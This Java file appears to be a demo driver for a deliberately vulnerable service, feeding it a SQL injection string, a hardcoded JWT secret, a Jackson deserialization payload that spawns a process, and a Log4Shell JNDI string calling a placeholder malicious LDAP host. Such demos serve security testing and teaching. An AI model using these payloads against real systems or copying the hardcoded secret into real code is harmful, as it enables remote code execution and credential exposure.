package org.example;

public class DemoApplication {
    public static void main(String[] args) {
        VulnerableService service = new VulnerableService();
        // SQL Injection
        service.vulnerableSqlQuery("admin' OR '1'='1");

        String jwtSecret = "453533@#5cLKMnf8!JHbdE6vZ4UPpTfL";
        // Print the hardcoded secret
        service.printApiKey();
        // Jackson insecure deserialization demo payload (crafted malicious JSON)
        String maliciousJson = "{\"@class\":\"java.lang.AutoCloseable\",\"@type\":\"java.lang.ProcessBuilder\",\"command\":[\"calc\"]}";
        service.jacksonDeserialize(maliciousJson);
        // Log4j JNDI injection (Log4Shell) example input

        String maliciousLogInput = "${jndi:ldap://malicious-server.com/a}";
        service.log4jJndiInjection(maliciousLogInput);
    }
}
